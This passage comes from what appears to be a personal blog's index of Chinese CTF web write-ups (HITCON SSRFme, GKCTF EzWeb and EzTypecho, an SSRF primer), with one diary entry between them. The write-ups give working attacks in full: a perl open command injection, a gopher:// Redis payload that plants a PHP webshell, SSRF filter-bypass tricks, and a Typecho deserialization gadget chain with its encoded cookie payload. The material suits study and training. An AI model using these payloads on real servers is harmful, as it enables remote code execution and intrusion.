class="line">/sandbox/77653c231bd9d86116927c3bac2da423/1</span><br></pre></td></tr></table></figure><p>可下载到<code>readflag</code>文件<br><img src="/2020/11/03/HITCON-2017-SSRFme//4.png"></p><h2 id="2-GET-file-gt-perl-open"><a href="#2-GET-file-gt-perl-open" class="headerlink" title="2.GET+file -&gt; perl+open"></a>2.GET+file -&gt; perl+open</h2><blockquote><p>GET命令是通过perl执行的；perl在open当中可以执行命令；<code>GET+file协议</code>触发<code>perl+open</code></p></blockquote><p>然后又有<code>bash -c &quot;命令&quot;</code>相当于直接在linux里面执行<code>命令</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?url=file:bash%20-c%20/readflag|&amp;filename=1</span><br><span class="line">/sandbox/77653c231bd9d86116927c3bac2da423/1</span><br></pre></td></tr></table></figure><p><img src="/2020/11/03/HITCON-2017-SSRFme//6.png"></p><p><strong>得flag</strong><br><img src="/2020/11/03/HITCON-2017-SSRFme//5.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cdbd6821-9095-4b22-ad00-68614436812b&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生活杂记（一）</title>
      <link href="/2020/11/01/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%AE%B01/"/>
      <url>/2020/11/01/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<blockquote><p>今日份网易云</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1412559986&auto=1&height=66"></iframe><p>懒散的时间总是让人不珍惜，今天的时间安排真的很松，事实上这种很松的时间规划已经过了有两天了，回想这两天到底做了什么，其实搞的实在的东西真的不多，甚至可以说非常少，那这到底是为什么呢？</p><p><strong>原因出在哪里？</strong></p><p>1.原因主要是没多少动力，最近的心情因为一些原因变得很糟，总是不自觉得想发会儿呆回想往事，再想到未来。。。<br>2.其次是晚上熬夜太晚，基于第一个原因产生，睡眠时间不足算是其中的一环吧。<br>3.然后就是不够沉浸于所做的事情，或是把时间浪费在了不重要的事情之上了。<br>4.没提前搞好时间安排。<br>5.有点不知所措。</p><p><strong>明天也许会好点吧</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-EZ三剑客-EzWeb</title>
      <link href="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/"/>
      <url>/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我心非石不可转，我心匪席不可卷。</p></blockquote><iframe name="本地音频_春庭雪" src="./等什么君 - 春庭雪.mp3" marginwidth="1px" marginheight="20px" width="100%" height="80px" frameborder="1" 　scrolling="yes"></iframe><blockquote><p>本地音频的访问速度太慢了呀。<br><strong>本地音频，不行；网易云，行。</strong></p></blockquote><h2 id="1-x2F-secret"><a href="#1-x2F-secret" class="headerlink" title="1.&#x2F;?secret"></a>1.&#x2F;?secret</h2><p>进去之后就给出了一个主页，我们可以查看源代码，然后就能看到一个很明显的提示<code>&lt;!--?secret--&gt;</code>，访问<code>?secret</code>得下面的ip信息， </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:0a:fc:b8:09  </span><br><span class="line">          inet addr:10.252.184.9  Bcast:10.252.184.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class="line">          RX packets:25 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:24 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:4068 (4.0 KB)  TX bytes:4056 (4.0 KB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 02:42:ac:12:00:93  </span><br><span class="line">          inet addr:172.18.0.147  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:11 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:866 (866.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure><p>ip地址为<code>10.252.184.9</code></p><h2 id="2-file协议读取源码"><a href="#2-file协议读取源码" class="headerlink" title="2.file协议读取源码"></a>2.file协议读取源码</h2><p>然后可以用file协议读取一下源代码我们要让我们搜索的内容为<code>file:/etc/passwd</code>即可读取，如下图<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//1.png"></p><p>index.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    echo curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;submit&#x27;]))&#123;</span><br><span class="line">$url = $_GET[&#x27;url&#x27;];</span><br><span class="line">//echo $url.&quot;\n&quot;;</span><br><span class="line">if(preg_match(&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;, $url,$match))</span><br><span class="line">&#123;</span><br><span class="line">//var_dump($match);</span><br><span class="line">die(&#x27;别这样&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">curl($url);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;secret&#x27;]))&#123;</span><br><span class="line">system(&#x27;ifconfig&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//2.png"></p><h2 id="3-用http协议配合bp进行内网主机探测"><a href="#3-用http协议配合bp进行内网主机探测" class="headerlink" title="3.用http协议配合bp进行内网主机探测"></a>3.用http协议配合bp进行内网主机探测</h2><p>上面过滤掉的协议有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file:/</span><br><span class="line">dict</span><br></pre></td></tr></table></figure><p>还过滤了<code>127.0.0.1</code>和<code>localhost</code>这两个，还有个<code>is</code>（暂不知道哪个姿势可以利用到）。</p><p>那还没有过滤的协议还有<code>gopher和http协议</code>，用<code>http协议</code>可进行内网主机存活检测，火狐配合bp实现爆破<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//3.png"><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//4.png"><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//5.png"></p><p><strong>可见存在redis的主机为<code>10.252.184.11</code></strong><br>用<code>nmap</code>爆破出<code>6379</code>的<code>redis</code>端口:<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//7.png"><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//8.png"><br>不知道为啥，不指定<code>6379端口</code>就扫不出来Redis服务。<br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 9969ab83-1446-441e-808a-02a5793215c5.node3.buuoj.cn -p 6379</span><br></pre></td></tr></table></figure><p>可以发现确实有redis服务，<code>利用redis未授权访问的漏洞，在根目录下生成个文件shell.php</code>。</p><p>可以用下面的办法来制造<code>shell.php</code>。</p><h2 id="4-gopherus制造shell"><a href="#4-gopherus制造shell" class="headerlink" title="4.gopherus制造shell"></a>4.gopherus制造shell</h2><p>工具的下载链接为<a href="https://github.com/tarunkant/Gopherus">Gopherus下载GitHub</a>。</p><p><strong>怎么装Gopherus？</strong><br>下载后，拉到kali里面，<code>sh install.php</code>，如果报错，可先改一下<code>install.php</code><br><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//9.png"></p><p>完成安装工具之后，使用下面的命令生成<code>shell</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopherus --exploit redis</span><br></pre></td></tr></table></figure><p><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//10.png"></p><p><code>&lt;?php echo system(&quot;cat /flag&quot;);?&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><p><strong>上面这样肯定不行了啦，因为我们的关键词<code>127.0.0.1</code>被过滤了嘛，而且好像还是得用我们的Redis主机服务的ip。。。</strong></p><p>ip更换为内网Redis主机的ip为<code>10.252.184.11</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://10.252.184.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure><p><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//11.png"></p><h2 id="5-得flag"><a href="#5-得flag" class="headerlink" title="5.得flag"></a>5.得flag</h2><p><img src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb//12.png"><br>访问<code>http://10.252.184.11/shell.php</code>得flag。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1a61913e-ab9d-4d76-bf5f-8feb3dca2222&#125;</span><br></pre></td></tr></table></figure><blockquote><p>永远要做一个温柔的男孩子呀</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
            <tag> nmap </tag>
            
            <tag> Gopherus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2020/11/01/SSRF/"/>
      <url>/2020/11/01/SSRF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>检讨昨天没货，今天咋也得来一点。</p></blockquote><p><strong>下面是SSRF漏洞的简单介绍(真的就是非常简单的解释)</strong></p><p><a href="https://www.cnblogs.com/s0ky1xd/p/5859049.html">浅谈SSRFF漏洞</a><br><a href="https://www.jianshu.com/p/ad7b8079e0d5">SSRF</a></p><p><strong>一般解释</strong><br>SSRF(Server-Side Request Forgery:服务请求伪造)是一种由<code>攻击者构造</code>，从而<code>让服务端发起请求</code>的一种安全漏洞，它<code>将一个可以发起网络请求的服务当作跳板来攻击其他服务</code>，SSRF的<code>攻击目标一般是内网</code>。  </p><p><strong>出现的原因</strong><br>当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。</p><p><strong>SSRF的危害</strong></p><p>1.可以扫描内部网络<br>2.可以构造数据攻击内部主机</p><p><strong>产生的原因及一般原理</strong></p><p>产生的原因：<code>服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致可以从其他服务器的获取一定量的数据</code><br>例如：<br><code>http://www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p><blockquote><p>如果我们将<code>http://www.abc.com/1.jpg</code>换为与该服务器相连的内网服务器地址会产生什么效果呢？<br>如果存在该内网地址就会返回 <code>1xx</code> <code>2xx</code> 之类的状态码，不存在就会返回其他的状态码。</p></blockquote><p><strong>终极简析:</strong><br>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是<code>服务器并没有发现这个请求是非法的</code>，然后<code>服务器以它的身份来访问其他服务器的资源</code>。</p><p><strong>漏洞常见的位置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&gt; 分享：通过URL地址分享网页内容</span><br><span class="line">2&gt; 转码服务</span><br><span class="line">3&gt; 在线翻译</span><br><span class="line">4&gt; 图片加载与下载：通过URL地址加载或下载图片</span><br><span class="line">5&gt; 图片、文章收藏功能</span><br><span class="line">6&gt; 未公开的api实现以及其他调用URL的功能</span><br><span class="line">7&gt; 从URL关键字中寻找</span><br></pre></td></tr></table></figure><p><strong>绕过过滤</strong></p><blockquote><p>下面为比较高级的教程了。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* 使用`@`：http://www.abc.com@10.10.10.10 = 10.10.10.10</span><br><span class="line">* IP地址转换成十进制、八进制：127.0.0.1 = 2130706433</span><br><span class="line">* 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx</span><br><span class="line">* 端口绕过：ip后面加一个端口</span><br><span class="line">* xip.io：10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">        www.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">        mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">        foo.bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">* 通过js跳转</span><br></pre></td></tr></table></figure><p><strong>一般与各种（伪）协议联合使用</strong></p><blockquote><p>今天也是没有梦想的咸鱼。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-EZ三剑客-EzTypecho</title>
      <link href="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/"/>
      <url>/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/</url>
      
        <content type="html"><![CDATA[<blockquote><p>年年岁岁花相似，岁岁年年人不同</p></blockquote><h2 id="1-typecho反序列化"><a href="#1-typecho反序列化" class="headerlink" title="1.typecho反序列化"></a>1.typecho反序列化</h2><p>这是个框架的反序列化题目，好在已经有不少人复现过这道题了，那我们就能直接拿来先用着了。。。</p><p><a href="https://www.cnblogs.com/litlife/p/10798061.html">Typecho-反序列化漏洞学习</a></p><h2 id="2-payload使用"><a href="#2-payload使用" class="headerlink" title="2.payload使用"></a>2.payload使用</h2><p>这个得出的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Typecho_Feed&#123;</span><br><span class="line">private $_type;</span><br><span class="line">private $_items = array();</span><br><span class="line"></span><br><span class="line">public function __construct()&#123;</span><br><span class="line">$this-&gt;_type = &quot;RSS 2.0&quot;;</span><br><span class="line">$this-&gt;_items = array(</span><br><span class="line">array(</span><br><span class="line">&quot;title&quot; =&gt; &quot;test&quot;,</span><br><span class="line">&quot;link&quot; =&gt; &quot;test&quot;,</span><br><span class="line">&quot;data&quot; =&gt; &quot;20190430&quot;,</span><br><span class="line">&quot;author&quot; =&gt; new Typecho_Request(),</span><br><span class="line">),</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request&#123;</span><br><span class="line">private $_params = array();</span><br><span class="line">private $_filter = array();</span><br><span class="line"></span><br><span class="line">public function __construct()&#123;</span><br><span class="line">$this-&gt;_params = array(</span><br><span class="line">&quot;screenName&quot; =&gt; &quot;eval(&#x27;phpinfo();exit;&#x27;)&quot;,</span><br><span class="line">);</span><br><span class="line">$this-&gt;_filter = array(&quot;assert&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = array(</span><br><span class="line">&quot;adapter&quot; =&gt; $a,</span><br><span class="line">&quot;prefix&quot; =&gt; &quot;test&quot;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($c));</span><br></pre></td></tr></table></figure><p>得出的结果为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjIzOiJldmFsKCdwaHBpbmZvKCk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==</span><br></pre></td></tr></table></figure><p><strong>怎么用呢？</strong></p><p>先要把打开的界面调到安装的那里，就是下面的那样。。。<br><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho//1.png"></p><p>然后抓包，传到<code>repeater模块</code>，伪造cookie为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__typecho_config=刚才的那个东西</span><br></pre></td></tr></table></figure><p><strong>finish参数不可用</strong></p><p>结果按他的<code>/install.php?finish=a</code>得出下面的结果。<br><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho//2.png"></p><p>下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no, you can&#x27;t unserialize it without session QAQ</span><br></pre></td></tr></table></figure><p>应该是我们的参数<code>finish</code>被限制了。然后看下<code>install.php</code>的源代码，找其他的可用参数。<br>发现<code>start</code>参数应该也可以用。<br><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho//3.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjIzOiJldmFsKCdwaHBpbmZvKCk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ==</span><br></pre></td></tr></table></figure><p>然后用上面的payload就可以带出<code>ppinfo();</code>了。</p><h2 id="3-capture-the-flag"><a href="#3-capture-the-flag" class="headerlink" title="3.capture the flag"></a>3.capture the flag</h2><p>start&#x3D;a<br>用下面的脚本得<code>cookie: __typecho_config=得出的结果</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Typecho_Feed&#123;</span><br><span class="line">private $_type;</span><br><span class="line">private $_items = array();</span><br><span class="line"></span><br><span class="line">public function __construct()&#123;</span><br><span class="line">$this-&gt;_type = &quot;RSS 2.0&quot;;</span><br><span class="line">$this-&gt;_items = array(</span><br><span class="line">array(</span><br><span class="line">&quot;title&quot; =&gt; &quot;test&quot;,</span><br><span class="line">&quot;link&quot; =&gt; &quot;test&quot;,</span><br><span class="line">&quot;data&quot; =&gt; &quot;20190430&quot;,</span><br><span class="line">&quot;author&quot; =&gt; new Typecho_Request(),</span><br><span class="line">),</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request&#123;</span><br><span class="line">private $_params = array();</span><br><span class="line">private $_filter = array();</span><br><span class="line"></span><br><span class="line">public function __construct()&#123;</span><br><span class="line">$this-&gt;_params = array(</span><br><span class="line">&quot;screenName&quot; =&gt; &quot;eval(&#x27;system(\&#x27;cat /flag\&#x27;);exit;&#x27;)&quot;,     /**注意这里要用system方法，并且要将单引号转义*/</span><br><span class="line">);</span><br><span class="line">$this-&gt;_filter = array(&quot;assert&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Typecho_Feed();</span><br><span class="line"></span><br><span class="line">$c = array(</span><br><span class="line">&quot;adapter&quot; =&gt; $a,</span><br><span class="line">&quot;prefix&quot; =&gt; &quot;test&quot;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($c));</span><br></pre></td></tr></table></figure><p>最终的<code>REQUEST</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /install.php?start=a HTTP/1.1</span><br><span class="line">Host: 48246e94-c403-49c5-ab38-ebb096fd656c.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0</span><br><span class="line">Accept: text/html,application/xhtml+ xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://48246e94-c403-49c5-ab38-ebb096fd656c.node3.buuoj.cn/install.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line">Origin: http://48246e94-c403-49c5-ab38-ebb096fd656c.node3.buuoj.cn</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __typecho_lang=zh_CN; 